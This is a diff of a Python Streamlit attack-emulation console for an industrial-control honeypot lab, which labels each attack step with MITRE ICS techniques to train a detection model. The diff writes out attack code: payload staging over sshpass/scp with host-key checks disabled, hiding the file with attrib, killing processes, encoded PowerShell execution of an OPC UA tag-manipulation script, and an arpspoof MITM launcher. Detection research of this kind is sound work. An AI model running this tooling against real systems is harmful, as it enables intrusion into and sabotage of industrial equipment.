@@ -1,11 +1,13 @@
 from __future__ import annotations
 
 import os
+import signal
 import socket
 import subprocess
 import json
 import re
 import base64
+import shlex
 import time
 import secrets
 import urllib.error
@@ -29,7 +31,7 @@ MONITOR_HOST = "192.168.1.9"
 SMB_TARGET = "192.168.1.7"
 HISTORIAN_HOST = "192.168.1.10"
 
-GRAFANA_URL = f"http://{MONITOR_HOST}:3000/d/adx2v2p/soc-honeypot-detection-dashboard?orgId=1&from=now-24h&to=now&timezone=browser&refresh=2m"
+GRAFANA_URL = f"http://{MONITOR_HOST}:3000/d/adx2v2p/soc-honeypot-detection-dashboard?orgId=1&from=now-2h&to=now&timezone=browser&refresh=10s"
 WAZUH_URL = f"https://{MONITOR_HOST}"
 HISTORIAN_URL = f"http://{HISTORIAN_HOST}:5000"
 LOKI_URL = f"http://{MONITOR_HOST}:3100"
@@ -42,7 +44,10 @@ ARPSPOOF_TARGET_1 = HISTORIAN_HOST
 ARPSPOOF_TARGET_2 = "192.168.1.11"
 
 MANIPULATE_TEMPLATE_PATH = Path(__file__).resolve().parent / "payloads" / "telemetry_sync_cache.py"
-MANIPULATE_SCRIPT = r"C:\Users\john\AppData\Local\Microsoft\Diagnosis\telemetry_sync_cache.py"
+MANIPULATE_SCRIPT = r"C:\Users\john\AppData\Local\Microsoft\Diagnosis\Downloads\telemetry_sync_cache.py"
+REPO_ROOT = Path(__file__).resolve().parents[1]
+STREAMLIT_SCENARIO_ROOT = REPO_ROOT / "artifacts" / "scenario-runs"
+ML_MODEL_PATH = REPO_ROOT / "ml" / "runs" / "latest" / "model.pt"
 SYNTHETIC_MARKERS_ENABLED = os.environ.get("STREAMLIT_SYNTHETIC_MARKERS", "0") == "1"
 SYNTHETIC_ZEEK_FEED_PATH = Path("/home/ceo/zeek_feed.synthetic.log")
 SYNTHETIC_WAZUH_ALERTS_PATH = Path("/home/ceo/wazuh_alerts.synthetic.json")
@@ -59,7 +64,7 @@ def append_json_line(path: Path, payload: Dict) -> None:
 
 def write_synthetic_zeek_marker(payload: Dict) -> Tuple[bool, str]:
     if not SYNTHETIC_MARKERS_ENABLED:
-        return False, "synthetic Zeek marker injection disabled (set STREAMLIT_SYNTHETIC_MARKERS=1 to re-enable)"
+        return False, ""
 
     append_json_line(SYNTHETIC_ZEEK_FEED_PATH, payload)
     return True, str(SYNTHETIC_ZEEK_FEED_PATH)
@@ -67,7 +72,7 @@ def write_synthetic_zeek_marker(payload: Dict) -> Tuple[bool, str]:
 
 def write_synthetic_wazuh_alert(payload: Dict) -> Tuple[bool, str]:
     if not SYNTHETIC_MARKERS_ENABLED:
-        return False, "synthetic Wazuh marker injection disabled (set STREAMLIT_SYNTHETIC_MARKERS=1 to re-enable)"
+        return False, ""
 
     append_json_line(SYNTHETIC_WAZUH_ALERTS_PATH, payload)
     return True, str(SYNTHETIC_WAZUH_ALERTS_PATH)
@@ -79,29 +84,88 @@ def load_manipulation_payload() -> str:
 
 def build_manipulation_display(opcua_endpoint: str, remote_path: str) -> str:
     return (
+        f"copy telemetry_sync_cache.py {remote_path}\n"
         f"$dest = '{remote_path}'\n"
-        "$dir = Split-Path -Parent $dest\n"
-        "New-Item -ItemType Directory -Force -Path $dir | Out-Null\n"
-        "[IO.File]::WriteAllText($dest, <embedded python payload>, [Text.Encoding]::UTF8)\n"
+        "attrib +h $dest\n"
         f"py -3.11 $dest --endpoint {opcua_endpoint} --cycles 18 --pause 1.0"
     )
 
 
 def build_manipulation_exec(opcua_endpoint: str, remote_path: str) -> str:
-    payload_b64 = base64.b64encode(load_manipulation_payload().encode("utf-8")).decode("ascii")
     dest = remote_path.replace("'", "''")
     endpoint = opcua_endpoint.replace("'", "''")
     stage_ps = (
         f"$dest='{dest}';"
-        "$dir=Split-Path -Parent $dest;"
-        "New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
-        f"$code=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{payload_b64}'));"
-        "[IO.File]::WriteAllText($dest,$code,[Text.Encoding]::UTF8);"
+        "if (-not (Test-Path $dest)) { Write-Output 'staged payload missing'; exit 1 };"
         "attrib +h $dest > $null 2>&1;"
         "if (-not (Get-Command py -ErrorAction SilentlyContinue)) { Write-Output 'py launcher not found'; exit 1 };"
         f"& py -3.11 $dest --endpoint '{endpoint}' --cycles 18 --pause 1.0"
     )
     return powershell_encoded_command(stage_ps)
+
+
+def windows_path_to_scp(path: str) -> str:
+    normalized = path.replace("\\", "/")
+    if re.match(r"^[A-Za-z]:/", normalized):
+        return f"/{normalized}"
+    return normalized
+
+
+def stage_remote_manipulation_payload(remote_path: str) -> Tuple[int, str]:
+    ok, msg = ssh_credentials_ready()
+    if not ok:
+        return -1, f"[INPUT ERROR] {msg}"
+
+    remote_path = sanitize_windows_token(remote_path) or MANIPULATE_SCRIPT
+    remote_dir = remote_path.rsplit("\\", 1)[0]
+    path_escaped = remote_path.replace("'", "''")
+    dir_escaped = remote_dir.replace("'", "''")
+    prep_ps = (
+        "$existing = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | "
+        "Where-Object { $_.CommandLine -like '*telemetry_sync_cache.py*' };"
+        "foreach ($proc in $existing) {"
+        "  try { Stop-Process -Id $proc.ProcessId -Force -ErrorAction Stop } catch {}"
+        "};"
+        f"$dir='{dir_escaped}';"
+        "New-Item -ItemType Directory -Force -Path $dir | Out-Null;"
+        f"$dest='{path_escaped}';"
+        "if (Test-Path $dest) {"
+        "  attrib -h -r $dest > $null 2>&1;"
+        "  Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue;"
+        "}"
+    )
+    prep_rc, prep_out = run_remote_capture(powershell_encoded_command(prep_ps), 45)
+    if prep_rc != 0:
+        return prep_rc, prep_out
+
+    scp_target = f"{st.session_state.ews_user}@{st.session_state.ews_host}:{windows_path_to_scp(remote_path)}"
+    try:
+        proc = subprocess.run(
+            [
+                "sshpass",
+                "-p",
+                st.session_state.ews_password,
+                "scp",
+                "-q",
+                "-o",
+                "StrictHostKeyChecking=no",
+                "-o",
+                "UserKnownHostsFile=/dev/null",
+                str(MANIPULATE_TEMPLATE_PATH),
+                scp_target,
+            ],
+            capture_output=True,
+            text=True,
+            timeout=45,
+        )
+    except subprocess.TimeoutExpired:
+        return -1, "[STAGE ERROR] payload upload timed out after 45s"
+
+    if proc.returncode != 0:
+        merged = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip()
+        return proc.returncode, f"[STAGE ERROR] payload upload failed.\n{merged}".strip()
+
+    return 0, f"staged telemetry_sync_cache.py to {remote_path}"
 
 
 def build_opc_probe_display(opc_host: str, opc_port: int) -> str:
@@ -143,6 +207,11 @@ def build_arpspoof_display(exe: str, iface: str, target_1: str, target_2: str) -
     return f'cmd /c "{exe} {target_1} {target_2}"'
 
 
+def build_arpspoof_managed_launch(exe: str, iface: str, target_1: str, target_2: str, remote_log: str) -> str:
+    iface_part = f' -i \\"{iface}\\"' if iface.strip() else ""
+    return f'cmd /c "{exe}{iface_part} {target_1} {target_2} > {remote_log} 2>&1"'
+
+
 @dataclass
 class AttackStep:
     idx: int
@@ -167,6 +236,74 @@ class AttackVariant:
     exec_mode: str = "local"
     timeout: int = 180
     expected_rules: Tuple[str, ...] = ()
+
+
+def streamlit_variant_metadata(variant_key: str) -> Dict[str, str]:
+    mapping = {
+        "failed_ssh_then_success": {
+            "scenario_step": "variant_failed_ssh_then_success",
+            "attack_label": "credential_access",
+            "attack_stage": "credential_access",
+            "asset_class": "ews",
+            "mitre_technique": "T0812",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "ews",
+            "event_kind": "ssh_session",
+        },
+        "powershell_recon": {
+            "scenario_step": "variant_powershell_recon",
+            "attack_label": "recon",
+            "attack_stage": "host_command",
+            "asset_class": "ews",
+            "mitre_technique": "T0842",
+            "source_asset": "ews",
+            "target_asset": "ews",
+            "event_kind": "process_launch",
+        },
+        "smb_deep_collection": {
+            "scenario_step": "variant_smb_deep_collection",
+            "attack_label": "collection",
+            "attack_stage": "smb_access",
+            "asset_class": "smb",
+            "mitre_technique": "T0811",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "smb",
+            "event_kind": "smb_browse",
+        },
+        "historian_heavy_collection": {
+            "scenario_step": "variant_historian_heavy_collection",
+            "attack_label": "collection",
+            "attack_stage": "historian_web",
+            "asset_class": "historian",
+            "mitre_technique": "T0802",
+            "source_asset": "ews",
+            "target_asset": "historian",
+            "event_kind": "http_request",
+        },
+        "critical_opcua_write": {
+            "scenario_step": "variant_critical_opcua_write",
+            "attack_label": "impact",
+            "attack_stage": "opcua_write",
+            "asset_class": "opcua",
+            "mitre_technique": "T0831",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "opcua",
+            "event_kind": "payload_send",
+        },
+    }
+    return mapping.get(
+        variant_key,
+        {
+            "scenario_step": f"variant_{variant_key}",
+            "attack_label": "attack",
+            "attack_stage": "host_command",
+            "asset_class": "ews",
+            "mitre_technique": "T0000",
+            "source_asset": "unknown",
+            "target_asset": "unknown",
+            "event_kind": "process_launch",
+        },
+    )
 
 
 def init_state() -> None:
@@ -197,6 +334,10 @@ def init_state() -> None:
         st.session_state.mitm_local_pids = []
     if "mitm_local_sudo_password" not in st.session_state:
         st.session_state.mitm_local_sudo_password = ""
+    if "mitm_remote_ssh_pid" not in st.session_state:
+        st.session_state.mitm_remote_ssh_pid = 0
+    if "mitm_remote_log" not in st.session_state:
+        st.session_state.mitm_remote_log = ""
     if "evidence_out" not in st.session_state:
         st.session_state.evidence_out = {}
     if "arp_before" not in st.session_state:
@@ -234,7 +375,7 @@ def init_state() -> None:
     if "demo_session_id" not in st.session_state:
         st.session_state.demo_session_id = new_demo_session_id()
     if "inject_demo_markers" not in st.session_state:
-        st.session_state.inject_demo_markers = True
+        st.session_state.inject_demo_markers = False
     if "custom_exec_mode" not in st.session_state:
         st.session_state.custom_exec_mode = "ews"
     if "custom_command_input" not in st.session_state:
@@ -255,6 +396,454 @@ def get_demo_session_id() -> str:
         sid = new_demo_session_id()
         st.session_state.demo_session_id = sid
     return sid
+
+
+def streamlit_manifest_path() -> Path:
+    session_id = get_demo_session_id()
+    out_dir = STREAMLIT_SCENARIO_ROOT / session_id
+    out_dir.mkdir(parents=True, exist_ok=True)
+    return out_dir / "ground_truth.jsonl"
+
+
+def manifest_path_for_session(session_id: str) -> Path:
+    return STREAMLIT_SCENARIO_ROOT / session_id / "ground_truth.jsonl"
+
+
+def manifest_window_for_session(session_id: str) -> Tuple[str, str] | None:
+    if not session_id or session_id == ".*":
+        return None
+
+    manifest_path = manifest_path_for_session(session_id)
+    if not manifest_path.exists():
+        return None
+
+    start_ts: float | None = None
+    end_ts: float | None = None
+    for raw_line in manifest_path.read_text(encoding="utf-8").splitlines():
+        line = raw_line.strip()
+        if not line:
+            continue
+        try:
+            row = json.loads(line)
+        except json.JSONDecodeError:
+            continue
+        row_start = row.get("start_ts_epoch")
+        row_end = row.get("end_ts_epoch")
+        if isinstance(row_start, (int, float)):
+            start_ts = row_start if start_ts is None else min(start_ts, float(row_start))
+        if isinstance(row_end, (int, float)):
+            end_ts = row_end if end_ts is None else max(end_ts, float(row_end))
+
+    if start_ts is None:
+        return None
+
+    start_ms = str(max(0, int((start_ts - 120) * 1000)))
+    if end_ts is None or (time.time() - float(end_ts)) <= 600:
+        end_value = "now"
+    else:
+        end_value = str(int((float(end_ts) + 180) * 1000))
+    return start_ms, end_value
+
+
+def streamlit_output_path(step_name: str) -> Path:
+    safe_name = re.sub(r"[^A-Za-z0-9_.-]+", "_", step_name).strip("_") or "step"
+    return streamlit_manifest_path().parent / f"{int(time.time())}_{safe_name}.txt"
+
+
+def streamlit_session_summary() -> str:
+    return "Interactive Streamlit demo session executed from the operator console."
+
+
+def synthetic_markers_requested() -> bool:
+    return SYNTHETIC_MARKERS_ENABLED and bool(st.session_state.get("inject_demo_markers", False))
+
+
+def grafana_dashboard_base() -> str:
+    return (st.session_state.get("grafana_url", GRAFANA_URL) or GRAFANA_URL).strip() or GRAFANA_URL
+
+
+def grafana_link_for_session(session_value: str | None = None, time_from: str = "now-2h") -> str:
+    base = grafana_dashboard_base()
+    parsed = urllib.parse.urlsplit(base)
+    query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    query = [(key, value) for key, value in query if key not in {"var-session_id", "from", "to", "refresh"}]
+    session_scope = session_value if session_value is not None else get_demo_session_id()
+    start_value = time_from
+    end_value = "now"
+    manifest_window = manifest_window_for_session(session_scope)
+    if manifest_window is not None:
+        start_value, end_value = manifest_window
+    query.extend(
+        [
+            ("from", start_value),
+            ("to", end_value),
+            ("refresh", "10s"),
+            ("var-session_id", session_scope),
+        ]
+    )
+    return urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(query)))
+
+
+def derive_streamlit_session_outcome(metadata: Dict[str, str]) -> Tuple[str, str]:
+    stage = metadata.get("attack_stage", "unknown")
+    mapping = {
+        "benign_access": ("credential_access", "low"),
+        "discovery": ("discovery_scan", "medium"),
+        "credential_access": ("credential_access", "medium"),
+        "host_activity": ("credential_access", "medium"),
+        "host_command": ("host_recon", "high"),
+        "host_scriptblock": ("host_recon", "high"),
+        "smb_access": ("collection", "high"),
+        "historian_web": ("collection", "high"),
+        "opcua_path": ("ot_recon", "critical"),
+        "opcua_write": ("ot_impact", "critical"),
+        "process_anomaly": ("ot_impact", "critical"),
+    }
+    return mapping.get(stage, ("host_recon", "medium"))
+
+
+def streamlit_custom_command_metadata(command: str, exec_mode: str) -> Dict[str, str]:
+    raw = (command or "").strip()
+    cmd = raw.lower()
+    if "telemetry_sync_cache.py" in cmd or ("opc.tcp://" in cmd and "--cycles" in cmd):
+        return {
+            "scenario_step": "custom_opcua_write",
+            "attack_label": "impact",
+            "attack_stage": "opcua_write",
+            "asset_class": "opcua",
+            "mitre_technique": "T0831",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "opcua_server",
+            "event_kind": "payload_send",
+        }
+    if "4840" in cmd or "opcua" in cmd or "test-netconnection" in cmd:
+        return {
+            "scenario_step": "custom_opcua_probe",
+            "attack_label": "recon",
+            "attack_stage": "opcua_path",
+            "asset_class": "opcua",
+            "mitre_technique": "T0861",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "opcua_server",
+            "event_kind": "network_probe",
+        }
+    if "5000" in cmd or "/portal/history" in cmd or "/login" in cmd or "historian" in cmd:
+        return {
+            "scenario_step": "custom_historian_access",
+            "attack_label": "collection",
+            "attack_stage": "historian_web",
+            "asset_class": "historian",
+            "mitre_technique": "T0802",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "historian",
+            "event_kind": "http_request",
+        }
+    if "smbclient" in cmd or "get-smbmapping" in cmd or "\\\\" in raw or " 445" in cmd:
+        return {
+            "scenario_step": "custom_smb_access",
+            "attack_label": "collection",
+            "attack_stage": "smb_access",
+            "asset_class": "smb",
+            "mitre_technique": "T0811",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "smb_server",
+            "event_kind": "smb_browse",
+        }
+    if "arpspoof" in cmd:
+        return {
+            "scenario_step": "custom_arp_mitm",
+            "attack_label": "impact",
+            "attack_stage": "host_command",
+            "asset_class": "ews" if exec_mode == "ews" else "workstation",
+            "mitre_technique": "T1557",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "historian",
+            "event_kind": "process_launch",
+        }
+    if "nmap" in cmd or "ping " in cmd or "nc " in cmd or "netcat" in cmd:
+        return {
+            "scenario_step": "custom_discovery",
+            "attack_label": "recon",
+            "attack_stage": "discovery",
+            "asset_class": "level3",
+            "mitre_technique": "T0846",
+            "source_asset": "monitoring_laptop" if exec_mode == "local" else "ews",
+            "target_asset": "lab_network",
+            "event_kind": "network_probe",
+        }
+    if "powershell" in cmd or "whoami" in cmd or "hostname" in cmd or "ipconfig" in cmd or "get-process" in cmd or "tasklist" in cmd:
+        return {
+            "scenario_step": "custom_host_command",
+            "attack_label": "recon",
+            "attack_stage": "host_command",
+            "asset_class": "ews" if exec_mode == "ews" else "workstation",
+            "mitre_technique": "T0842",
+            "source_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "target_asset": "ews" if exec_mode == "ews" else "monitoring_laptop",
+            "event_kind": "process_launch",
+        }
+    if exec_mode == "local":
+        return {
+            "scenario_step": "custom_local_command",
+            "attack_label": "foothold",
+            "attack_stage": "benign_access",
+            "asset_class": "workstation",
+            "mitre_technique": "T0866",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "monitoring_laptop",
+            "event_kind": "shell_command",
+        }
+    return {
+        "scenario_step": "custom_ews_command",
+        "attack_label": "recon",
+        "attack_stage": "host_command",
+        "asset_class": "ews",
+        "mitre_technique": "T0842",
+        "source_asset": "ews",
+        "target_asset": "ews",
+        "event_kind": "process_launch",
+    }
+
+
+def streamlit_step_metadata(step_idx: int) -> Dict[str, str]:
+    if step_idx == 1:
+        return {
+            "scenario_step": "step_1_initial_foothold",
+            "attack_label": "foothold",
+            "attack_stage": "benign_access",
+            "asset_class": "workstation",
+            "mitre_technique": "T0866",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "monitoring_laptop",
+            "event_kind": "shell_command",
+        }
+    if step_idx == 2:
+        return {
+            "scenario_step": "step_2_service_discovery",
+            "attack_label": "discovery",
+            "attack_stage": "discovery",
+            "asset_class": "network",
+            "mitre_technique": "T0846",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "level3_network",
+            "event_kind": "network_scan",
+        }
+    if step_idx == 3:
+        return {
+            "scenario_step": "step_3_smb_credential_discovery",
+            "attack_label": "collection",
+            "attack_stage": "smb_access",
+            "asset_class": "smb",
+            "mitre_technique": "T0811",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "smb",
+            "event_kind": "smb_browse",
+        }
+    if step_idx == 4:
+        access_method = st.session_state.get("ews_access_method", "SSH")
+        return {
+            "scenario_step": "step_4_ews_access",
+            "attack_label": "lateral_movement",
+            "attack_stage": "host_activity",
+            "asset_class": "ews",
+            "mitre_technique": "T0866",
+            "source_asset": "monitoring_laptop",
+            "target_asset": "ews",
+            "event_kind": "rdp_session" if access_method == "RDP" else "ssh_session",
+        }
+    if step_idx == 5:
+        return {
+            "scenario_step": "step_5_historian_access",
+            "attack_label": "collection",
+            "attack_stage": "historian_web",
+            "asset_class": "historian",
+            "mitre_technique": "T0802",
+            "source_asset": "ews",
+            "target_asset": "historian",
+            "event_kind": "http_request",
+        }
+    if step_idx == 6:
+        return {
+            "scenario_step": "step_6_opcua_probe",
+            "attack_label": "recon",
+            "attack_stage": "opcua_path",
+            "asset_class": "opcua",
+            "mitre_technique": "T0861",
+            "source_asset": "ews",
+            "target_asset": "opcua",
+            "event_kind": "tcp_probe",
+        }
+    if step_idx == 7:
+        return {
+            "scenario_step": "step_7_arp_mitm",
+            "attack_label": "reconnaissance",
+            "attack_stage": "host_command",
+            "asset_class": "ews",
+            "mitre_technique": "T0830",
+            "source_asset": "ews",
+            "target_asset": "historian_opcua",
+            "event_kind": "mitm_command",
+        }
+    if step_idx == 8:
+        return {
+            "scenario_step": "step_8_tag_manipulation",
+            "attack_label": "impact",
+            "attack_stage": "opcua_write",
+            "asset_class": "opcua",
+            "mitre_technique": "T0831",
+            "source_asset": "ews",
+            "target_asset": "opcua",
+            "event_kind": "execution",
+        }
+    return {
+        "scenario_step": f"step_{step_idx}",
+        "attack_label": "attack",
+        "attack_stage": "host_command",
+        "asset_class": "ews",
+        "mitre_technique": "T0000",
+        "source_asset": "unknown",
+        "target_asset": "unknown",
+        "event_kind": "process_launch",
+    }
+
+
+def append_streamlit_session_record(
+    *,
+    metadata: Dict[str, str],
+    command: str,
+    output: str,
+    exit_code: int,
+    start_ts: float,
+    end_ts: float,
+    output_file: Path | None = None,
+    session_intent: str | None = None,
+    session_danger_label: str | None = None,
+) -> None:
+    manifest = streamlit_manifest_path()
+    output_path = output_file or streamlit_output_path(metadata.get("scenario_step", "step"))
+    derived_intent, derived_danger = derive_streamlit_session_outcome(metadata)
+    output_path.write_text(output, encoding="utf-8")
+    record = {
+        "scenario_id": get_demo_session_id(),
+        "session_id": get_demo_session_id(),
+        "scenario_family": "streamlit_manual_session",
+        "ground_truth_label": "attack",
+        "dataset_split": "ml_live_labeled",
+        "telemetry_origin": "live_sensor",
+        "session_intent": session_intent or derived_intent,
+        "session_danger_label": session_danger_label or derived_danger,
+        "session_summary": streamlit_session_summary(),
+        "start_ts_epoch": round(start_ts, 6),
+        "end_ts_epoch": round(end_ts, 6),
+        "exit_code": int(exit_code),
+        "command": command,
+        "output_file": str(output_path),
+        **metadata,
+    }
+    with manifest.open("a", encoding="utf-8") as fh:
+        fh.write(json.dumps(record, ensure_ascii=True) + "\n")
+
+
+def publish_current_streamlit_session_to_ml() -> None:
+    manifest = streamlit_manifest_path()
+    if not manifest.exists() or not ML_MODEL_PATH.exists():
+        return
+    try:
+        session_file_arg = str(manifest.relative_to(REPO_ROOT))
+    except ValueError:
+        session_file_arg = os.path.relpath(str(manifest), str(REPO_ROOT))
+    try:
+        model_path_arg = str(ML_MODEL_PATH.relative_to(REPO_ROOT))
+    except ValueError:
+        model_path_arg = os.path.relpath(str(ML_MODEL_PATH), str(REPO_ROOT))
+    if os.environ.get("STREAMLIT_SYNC_ML_PUBLISH", "0") != "1":
+        log_path = REPO_ROOT / "artifacts" / "ml_live_publish.log"
+        log_path.parent.mkdir(parents=True, exist_ok=True)
+        quoted_model = shlex.quote(model_path_arg)
+        quoted_session = shlex.quote(session_file_arg)
+        background_cmd = (
+            "flock -n /tmp/honeypot_ml_live_publish.lock bash -lc "
+            + shlex.quote(
+                "docker compose -f compose/docker-compose.ml.yml up -d lstm-session-runtime "
+                "&& docker compose -f compose/docker-compose.ml.yml exec -T lstm-session-runtime "
+                f"python -m ml.lstm_session.publish_live_session --model-path {quoted_model} "
+                f"--session-file {quoted_session} --output-dir monitoring/ml "
+                "|| docker compose -f compose/docker-compose.ml.yml run --rm --entrypoint python lstm-session-model "
+                f"-m ml.lstm_session.publish_live_session --model-path {quoted_model} "
+                f"--session-file {quoted_session} --output-dir monitoring/ml"
+            )
+        )
+        try:
+            with log_path.open("ab") as log_fh:
+                subprocess.Popen(
+                    ["bash", "-lc", background_cmd],
+                    cwd=str(REPO_ROOT),
+                    stdout=log_fh,
+                    stderr=subprocess.STDOUT,
+                    start_new_session=True,
+                )
+        except Exception:
+            return
+        return
+    try:
+        compose_cmd = ["docker", "compose", "-f", "compose/docker-compose.ml.yml"]
+        subprocess.run(
+            [*compose_cmd, "up", "-d", "lstm-session-runtime"],
+            cwd=str(REPO_ROOT),
+            capture_output=True,
+            text=True,
+            timeout=90,
+            check=False,
+        )
+        exec_proc = subprocess.run(
+            [
+                *compose_cmd,
+                "exec",
+                "-T",
+                "lstm-session-runtime",
+                "python",
+                "-m",
+                "ml.lstm_session.publish_live_session",
+                "--model-path",
+                model_path_arg,
+                "--session-file",
+                session_file_arg,
+                "--output-dir",
+                "monitoring/ml",
+            ],
+            cwd=str(REPO_ROOT),
+            capture_output=True,
+            text=True,
+            timeout=90,
+            check=False,
+        )
+        if exec_proc.returncode == 0:
+            return
+        subprocess.run(
+            [
+                *compose_cmd,
+                "run",
+                "--rm",
+                "--entrypoint",
+                "python",
+                "lstm-session-model",
+                "-m",
+                "ml.lstm_session.publish_live_session",
+                "--model-path",
+                model_path_arg,
+                "--session-file",
+                session_file_arg,
+                "--output-dir",
+                "monitoring/ml",
+            ],
+            cwd=str(REPO_ROOT),
+            capture_output=True,
+            text=True,
+            timeout=90,
+            check=False,
+        )
+    except Exception:
+        return
 
 def ssh_credentials_ready() -> Tuple[bool, str]:
     if not st.session_state.ews_host.strip():
@@ -455,33 +1044,97 @@ def set_command_result(buffer_key: str, command: str, output: str, rc: int, targ
 
 def start_step(step: AttackStep, command_override: str | None = None) -> None:
     step_key = f"step_{step.idx}"
-    inject_markers = st.session_state.get("inject_demo_markers", False) or bool(get_demo_session_id())
+    inject_markers = synthetic_markers_requested()
     st.session_state.running[step_key] = True
     command_to_run = (command_override or step.command_exec).strip() or step.command_exec
+    stage_output = ""
+    step_start_ts = time.time()
+    if step.idx == 8:
+        remote_path = st.session_state.get("manipulate_script", MANIPULATE_SCRIPT).strip() or MANIPULATE_SCRIPT
+        stage_start_ts = time.time()
+        stage_rc, stage_msg = stage_remote_manipulation_payload(remote_path)
+        stage_end_ts = time.time()
+        if stage_rc != 0:
+            set_command_result(step_key, f"[stage] {remote_path}", stage_msg, stage_rc)
+            append_streamlit_session_record(
+                metadata={
+                    "scenario_step": "step_8_stage_payload",
+                    "attack_label": "impact",
+                    "attack_stage": "host_command",
+                    "asset_class": "ews",
+                    "mitre_technique": "T0831",
+                    "source_asset": "monitoring_laptop",
+                    "target_asset": "ews",
+                    "event_kind": "file_stage",
+                },
+                command=f"[stage] {remote_path}",
+                output=stage_msg,
+                exit_code=stage_rc,
+                start_ts=stage_start_ts,
+                end_ts=stage_end_ts,
+            )
+            publish_current_streamlit_session_to_ml()
+            st.session_state.running[step_key] = False
+            return
+        append_streamlit_session_record(
+            metadata={
+                "scenario_step": "step_8_stage_payload",
+                "attack_label": "impact",
+                "attack_stage": "host_command",
+                "asset_class": "ews",
+                "mitre_technique": "T0831",
+                "source_asset": "monitoring_laptop",
+                "target_asset": "ews",
+                "event_kind": "file_stage",
+            },
+            command=f"[stage] {remote_path}",
+            output=stage_msg,
+            exit_code=stage_rc,
+            start_ts=stage_start_ts,
+            end_ts=stage_end_ts,
+        )
+        stage_output = f"[payload staging]\n{stage_msg}\n\n"
     rc, output = execute_command(command_to_run, step.exec_mode, step.timeout)
+    step_end_ts = time.time()
+    if stage_output:
+        output = stage_output + output
     if step.idx == 3 and inject_markers:
         smb_marker_out = emit_smb_browse_marker()
         if rc != 0:
             smb_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + smb_marker_out
-        output = output + "\n\n" + smb_marker_out
+        if smb_marker_out.strip():
+            output = output + "\n\n" + smb_marker_out
     if step.idx == 4 and inject_markers:
         endpoint_marker_out = emit_endpoint_markers()
-        output = output + "\n\n" + endpoint_marker_out
+        if endpoint_marker_out.strip():
+            output = output + "\n\n" + endpoint_marker_out
     if step.idx == 5 and inject_markers:
         web_marker_out = emit_historian_web_marker()
         if rc != 0:
             web_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + web_marker_out
-        output = output + "\n\n" + web_marker_out
+        if web_marker_out.strip():
+            output = output + "\n\n" + web_marker_out
     if step.idx == 6 and inject_markers:
         opc_probe_marker_out = emit_opcua_probe_marker()
         if rc != 0:
             opc_probe_marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + opc_probe_marker_out
-        output = output + "\n\n" + opc_probe_marker_out
+        if opc_probe_marker_out.strip():
+            output = output + "\n\n" + opc_probe_marker_out
     if step.idx == 8 and inject_markers:
         marker_out = emit_demo_markers(opcua_critical=True, ingest_anomaly=True)
         if rc != 0:
             marker_out = "[DEMO MARKER NOTICE] step command failed; emitting fallback session marker.\n" + marker_out
-        output = output + "\n\n" + marker_out
+        if marker_out.strip():
+            output = output + "\n\n" + marker_out
+    append_streamlit_session_record(
+        metadata=streamlit_step_metadata(step.idx),
+        command=command_to_run,
+        output=output,
+        exit_code=rc,
+        start_ts=step_start_ts,
+        end_ts=step_end_ts,
+    )
+    publish_current_streamlit_session_to_ml()
     set_command_result(step_key, command_to_run, output, rc)
     st.session_state.running[step_key] = False
 
@@ -490,7 +1143,17 @@ def start_variant(variant: AttackVariant, command_override: str | None = None) -
     variant_key = f"variant_{variant.key}"
     st.session_state.running[variant_key] = True
     command_to_run = (command_override or variant.command_exec).strip() or variant.command_exec
+    start_ts = time.time()
     rc, output = execute_command(command_to_run, variant.exec_mode, variant.timeout)
+    append_streamlit_session_record(
+        metadata=streamlit_variant_metadata(variant.key),
+        command=command_to_run,
+        output=output,
+        exit_code=rc,
+        start_ts=start_ts,
+        end_ts=time.time(),
+    )
+    publish_current_streamlit_session_to_ml()
     set_command_result(variant_key, command_to_run, output, rc)
     st.session_state.running[variant_key] = False
 
@@ -502,7 +1165,17 @@ def run_custom_command() -> None:
     timeout = int(st.session_state.get("custom_timeout", 90))
     use_pty = bool(st.session_state.get("custom_use_pty", False))
     command = st.session_state.get("custom_command_input", "")
+    start_ts = time.time()
     rc, output = execute_command(command, exec_mode, timeout, use_pty=use_pty)
+    append_streamlit_session_record(
+        metadata=streamlit_custom_command_metadata(command, exec_mode),
+        command=command,
+        output=output,
+        exit_code=rc,
+        start_ts=start_ts,
+        end_ts=time.time(),
+    )
+    publish_current_streamlit_session_to_ml()
     target_label = "local attacker shell" if exec_mode == "local" else f"{st.session_state.ews_user}@{st.session_state.ews_host}"
     set_command_result(step_key, command, output, rc, target_label=target_label)
     st.session_state.running[step_key] = False
@@ -510,7 +1183,7 @@ def run_custom_command() -> None:
 
 def start_mitm(step_idx: int) -> None:
     step_key = f"step_{step_idx}"
-    inject_markers = st.session_state.get("inject_demo_markers", False) or bool(get_demo_session_id())
+    inject_markers = synthetic_markers_requested()
     ok, msg = ssh_credentials_ready()
     if not ok:
         st.session_state.buffers[step_key] = f"[INPUT ERROR] {msg}\n"
@@ -526,33 +1199,38 @@ def start_mitm(step_idx: int) -> None:
     st.session_state.arpspoof_path = exe
     list_cmd = 'cmd /c "C:\\Users\\john\\Downloads\\arpspoof.exe --list"'
     rc_list, out_list = run_remote_capture(list_cmd, 30, use_pty=True)
-    launch_ps = (
-        f"$exe='{exe.replace("'", "''")}';"
